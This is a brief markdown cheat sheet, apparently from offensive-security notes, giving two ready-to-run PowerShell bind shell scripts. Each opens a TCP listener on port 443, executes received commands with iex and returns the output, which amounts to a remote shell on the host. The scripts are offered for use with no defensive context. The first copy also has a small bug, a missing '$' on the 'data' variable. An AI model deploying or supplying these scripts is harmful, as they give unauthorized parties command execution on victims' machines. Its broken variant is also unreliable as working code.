# Powershell Bind Shells


## Powershell Bind Shell
```pwsh
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
	data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + 'PS' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
}
$client.Close()
$listener.Stop()
```

## Powershell Bind Shell Function
```pwsh
Function Get-BindShell ($ip, $port) {
	$listener = New-Object System.Net.Sockets.TcpListener($ip,[int]$port);
	$listener.start();
	$client = $listener.AcceptTcpClient();
	$stream = $client.GetStream();
	[byte[]]$bytes = 0..65535|%{0};
	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
		$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
		$sendback = (iex $data 2>&1 | Out-String );
		$sendback2 = $sendback + 'PS' + (pwd).Path + '> ';
		$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
		$stream.Write($sendbyte,0,$sendbyte.Length);
		$stream.Flush()
	}
	$client.Close()
	$listener.Stop()
}
Get-BindShell -ip 0.0.0.0 -port 443
```

